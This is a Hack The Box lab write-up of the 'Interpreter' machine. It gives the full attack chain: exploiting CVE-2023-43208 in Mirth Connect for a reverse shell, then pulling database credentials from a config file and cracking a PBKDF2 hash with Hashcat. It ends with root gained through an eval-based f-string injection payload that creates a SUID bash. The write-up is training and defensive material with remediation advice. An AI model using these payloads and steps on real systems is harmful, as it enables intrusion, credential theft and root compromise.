# Interpreter – Hack The Box Write-up

## 1. Overview

Mirth is a medium-difficulty Linux machine that demonstrates how an exposed web application can lead to complete system compromise. The attack begins by identifying a vulnerable Mirth Connect instance, followed by exploitation of a known Remote Code Execution vulnerability. After gaining initial access, sensitive configuration files reveal database credentials, allowing recovery of valid SSH credentials. Finally, a vulnerable Python service running with root privileges is exploited to obtain full administrative access.

> 
> 
> 
> **Difficulty:** Medium
> 
> **Platform:** Hack The Box
> 
> **Operating System:** Linux
> 
> **IP:** 10.129.5.115
> 
> **Categories:** Web Exploitation, Credential Access, Privilege Escalation
> 

---

## 2. Skills Demonstrated

| Skill | Description |
| --- | --- |
| Reconnaissance | Service Discovery |
| Enumeration | Version Fingerprinting |
| Exploitation | CVE-2023-43208 |
| Credential Access | Configuration Analysis |
| Password Cracking | PBKDF2 |
| Privilege Escalation | Python f-string Injection |

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| Nmap | Service discovery and version detection |
| Browser | Web application enumeration |
| Git | Downloading exploit PoC |
| Python | Exploit execution and payload creation |
| MySQL Client | Database enumeration |
| Hashcat | Password recovery |
| SSH | User access |
| Linux Utilities | Privilege escalation enumeration |

---

## 3. Attack Path

```mermaid
flowchart TD
    A([Start]) --> B[Reconnaissance]
    B --> C["Nmap Scan<br/>22, 80, 443 Open"]

    C --> D[Web Enumeration]
    D --> E["Identify Mirth Connect"]

    E --> F["Download webstart.jnlp"]
    F --> G["Extract Version<br/>Mirth Connect 4.4.0"]

    G --> H["Research CVE-2023-43208"]
    H --> I["Public Exploit Found"]

    I --> J["Exploit RCE"]
    J --> K["Reverse Shell"]

    K --> L["Upgrade TTY Shell"]

    L --> M["Local Enumeration"]
    M --> N["Locate mirth.properties"]

    N --> O["Extract MySQL Credentials"]

    O --> P["Access Database"]

    P --> Q["Recover User Hash"]

    Q --> R["Convert PBKDF2 Format"]
    R --> S["Hashcat Crack"]

    S --> T["SSH Login as sedric"]

    T --> U["User Flag"]

    U --> V["Privilege Escalation"]

    V --> W["Discover notif.py (Root Service)"]

    W --> X["Analyze Python Code"]

    X --> Y["Exploit f-string Injection"]

    Y --> Z["Execute Payload"]

    Z --> AA["Create SUID Bash"]

    AA --> BB["Root Shell"]

    BB --> CC([Capture Root Flag])
```



---

## 4. Reconnaissance

### Objective

The objective of this phase was to identify the exposed network services, determine the available attack surface, and gather information that could assist in further enumeration.

### Network Discovery

The target IP address was first assigned to a variable for easier command execution throughout the assessment.

```bash
ip=<Target-IP>
```

A default Nmap scan was then performed using service version detection and default NSE scripts.

```bash
nmap -sC -sV $ip
```

### Evidence

> **Nmap Scan Results**
> 


---

### Analysis

The scan identified three open TCP ports:

| Port | Service | Observation |
| --- | --- | --- |
| 22 | SSH | OpenSSH service available for remote administration. |
| 80 | HTTP | Web application accessible over HTTP. |
| 443 | HTTPS | Secure version of the web application available. |

The presence of both HTTP and HTTPS services suggested that the primary attack surface was the web application.

---

## 5. Enumeration & Vulnerability Identification

### Mirth Connect Identification

Accessing the target through a web browser revealed a web application running **Mirth Connect**, a healthcare integration platform that provides a web-based interface for managing integration channels.

> **Mirth Connect Homepage**
> 


The landing page contained a **Launch Mirth Connect Administrator** button. Selecting this option initiated the download of a Java Web Start (`webstart.jnlp`) file.

> **Downloaded JNLP File**
> 


### Version Discovery

The contents of the downloaded JNLP file revealed the exact version of the application.

> **Mirth Connect Version Information**
> 


The target was identified as running:

| Software | Version |
| --- | --- |
| Mirth Connect | **4.4.0** |

### CVE Research

With the software version identified, public vulnerability research was performed to determine whether any known security issues affected **Mirth Connect 4.4.0**.

Research identified **CVE-2023-43208**, a publicly disclosed **Remote Code Execution (RCE)** vulnerability affecting the target version.

| CVE | Severity | Description |
| --- | --- | --- |
| CVE-2023-43208 | High | Remote Code Execution (RCE) vulnerability affecting Mirth Connect 4.4.0. |


Additional research located a publicly available Proof-of-Concept (PoC) exploit that could be used to validate the vulnerability.

[https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208](https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208)

---

---

## 6. Initial Access

### Exploiting CVE-2023-43208

The publicly available exploit repository was cloned to the attack machine.

```bash
git clone https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208.git
```

### Exploitation

Based on the vulnerability research conducted during the enumeration phase, a publicly available Proof-of-Concept (PoC) exploit targeting **CVE-2023-43208** was selected.

The exploit repository was cloned from GitHub and the usage instructions are 

```python
python3 mirth_rce.py https://{target} <attacker_host> <attacker_port>
```

The exploit was executed against the vulnerable Mirth Connect instance, resulting in successful remote code execution.

### Reverse Shell

> **Successful Exploitation**
> 


---

## 7. Shell Stabilization

> **Interactive TTY Shell**
> 

A Python pseudo-terminal (PTY) was spawned to improve shell interaction.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The terminal was then configured to restore normal shell functionality.

```bash
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 170
```

---

## 8. Local Enumeration

### Configuration File Discovery

System directories were reviewed to identify application configuration files.

During enumeration, the **conf** directory was located, containing the **mirth.properties** configuration file.

> **Configuration Directory**
> 


The configuration file contained the application's database connection information.

> **Database Credentials**
> 


---

## 9. Credential Access

### MySQL Enumeration

Using the recovered database credentials, the MySQL database was accessed.

Inspection of the users table revealed the following account.

| Username | Password |
| --- | --- |
| sedric | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |

> **Database User Record**
> 


### Password Hash Analysis

The extracted password was not stored in plaintext. Mirth Connect 4.4.0 uses **PBKDF2-HMAC-SHA256** for password hashing.

Unlike weaker hashing algorithms such as MD5 or SHA-1, PBKDF2 applies key stretching by repeatedly processing the password with a cryptographic hash function. This makes brute-force and dictionary attacks significantly more expensive.

The stored hash consists of two main components:

| Component | Size | Purpose |
| --- | --- | --- |
| Salt | 8 bytes | Prevents precomputed rainbow table attacks |
| Derived Key | 32 bytes | Result of the PBKDF2-HMAC-SHA256 operation |

To perform offline password cracking, the original hash format was converted into a format supported by Hashcat.

### Password Cracking

The Base64 encoded hash was decoded, separated into its salt and derived key components, and reformatted according to Hashcat's PBKDF2-HMAC-SHA256 format.

```bash
python3 -c "
import base64

raw = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')

salt = base64.b64encode(raw[:8]).decode()
dk = base64.b64encode(raw[8:]).decode()

print(f'sha256:600000:{salt}:{dk}')
" > hash.txt
```

The converted hash was then tested against a password dictionary using Hashcat.

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force
```

> **Hashcat Password Recovery**
> 


The dictionary attack successfully recovered the plaintext password.

| Username | Password |
| --- | --- |
| sedric | `snowflake1` |

---

## 10. User Access

### SSH Authentication

Using the recovered credentials, SSH authentication was attempted.

```bash
ssh sedric@<target-ip>
```

Authentication succeeded, providing direct shell access as the **sedric** user.

> **Successful SSH Login**
> 


The user flag was then successfully captured.

---

## 11. Privilege Escalation & Root Access

### Root Service Discovery

After obtaining SSH access as the `sedric` user, local enumeration was performed to identify potential privilege escalation opportunities.

During this process, a Python Flask application named `notif.py` was discovered running with **root privileges** on the local machine.

The service was bound to:

```
127.0.0.1:54321
```


### **Source Code Review**

`notify.py`

```python
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

### Application Analysis

The service was a simple Flask-based notification server responsible for processing patient information received from Mirth Connect.

The application exposed a single endpoint:

```
POST /addPatient
```

The endpoint accepted XML data containing patient information and generated notification files.

The service only accepted requests from localhost:

```python
if request.remote_addr != "127.0.0.1":
    abort(403)
```

Although the service was not externally accessible, local users could interact with it.

### Vulnerability Identification

Reviewing the source code revealed an insecure implementation inside the `template()` function.

The application attempted to generate formatted messages using a Python f-string:

```python
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"

return eval(f"f'''{template}'''")
```

The use of `eval()` on user-controlled input introduced a critical **Python Expression Injection** vulnerability.

### Root Cause Analysis

The application attempted to sanitize input using a regular expression:

```python
pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
```

However, the filter allowed curly braces `{}` characters.

Because the user-controlled input was later passed into an evaluated f-string, expressions wrapped inside `{}` were executed by Python.

For example:

```python
{2+3}
```

was interpreted and evaluated as:

```
5
```

This confirmed arbitrary expression execution.

### Exploitation for Root Shell

Since the `os` module was already imported by the application, operating system commands could be executed through the vulnerable expression.

A payload was injected into the `sender_app` parameter:

```xml
<sender_app>{os.system("/tmp/p.sh")}</sender_app>
```

The malicious XML payload was submitted to the local Flask service:

```xml
<patient>
    <firstname>a</firstname>
    <lastname>b</lastname>
    <sender_app>{os.system("/tmp/p.sh")}</sender_app>
    <timestamp>d</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
</patient>
```

The helper script created a SUID-enabled Bash binary:

```bash
# Write the payload script
echo 'cp /bin/bash /tmp/.sh && chmod 4755 /tmp/.sh' > /tmp/p.sh
chmod +x /tmp/p.sh

# Now inject using only allowed chars - execute /tmp/p.sh
cat > /tmp/exploit.xml << 'EOF'
<patient>
<firstname>a</firstname>
<lastname>b</lastname>
<sender_app>{os.system("/tmp/p.sh")}</sender_app>
<timestamp>d</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>M</gender>
</patient>
EOF
wget --post-file=/tmp/exploit.xml --header="Content-Type: application/xml" http://127.0.0.1:54321/addPatient -O -

# Check result
ls -la /tmp/.sh
/tmp/.sh -p
whoami
```

> **Exploit Payload Execution for root**
> 


### Impact

The vulnerable implementation of `eval()` allowed an attacker with local access to execute arbitrary Python expressions as the root user.

By chaining:

```
Local Service Enumeration
        ↓
Python f-string Injection
        ↓
Command Execution as Root
        ↓
SUID Bash Creation
        ↓
Root Shell
```

complete system compromise was achieved.

---

## 12. Remediation

### Mirth Connect Remote Code Execution (CVE-2023-43208)

**Issue:**
The server was running a vulnerable version of Mirth Connect affected by a known Remote Code Execution vulnerability.

**Recommendation:**

- Upgrade Mirth Connect to the latest patched version.
- Restrict access to the Mirth Administrator interface.
- Monitor exposed administrative services.
- Apply security updates regularly.

### Sensitive Credential Exposure

**Issue:**

Database credentials were stored inside the Mirth configuration file, allowing local users to retrieve authentication information.

**Recommendation:**

- Avoid storing plaintext credentials in application configuration files.
- Use proper secrets management solutions.
- Restrict file permissions on sensitive configuration files.

### Weak Password Policy

**Issue:**

Although Mirth Connect used PBKDF2-HMAC-SHA256 password hashing, the recovered password was weak enough to be cracked using a dictionary attack.

**Recommendation:**

- Enforce strong password policies.
- Require complex passwords.
- Enable multi-factor authentication where possible.

### Python Expression Injection

**Issue:**

The notification service used `eval()` to process user-controlled input, resulting in arbitrary code execution with root privileges.

**Recommendation:**

- Never use `eval()` with untrusted input.
- Use safe template rendering methods.
- Implement strict input validation.
- Run services with the minimum required privileges.

### Privileged Service Misconfiguration

**Issue:**

The notification service was running as root, allowing exploitation of application vulnerabilities to directly compromise the entire system.

**Recommendation:**

- Follow the principle of least privilege.
- Run applications using dedicated low-privileged service accounts.
- Apply proper access controls.

---

## 13. Lessons Learned

During this assessment, the following security concepts were explored:

- Network service enumeration using Nmap.
- Web application fingerprinting and vulnerability research.
- Exploitation of CVE-2023-43208 for initial access.
- Extraction and analysis of application configuration files.
- Understanding PBKDF2 password hashing and offline cracking.
- Identifying insecure Python `eval()` usage.
- Exploiting Python expression injection for privilege escalation.
- Importance of secure coding practices and least privilege principles.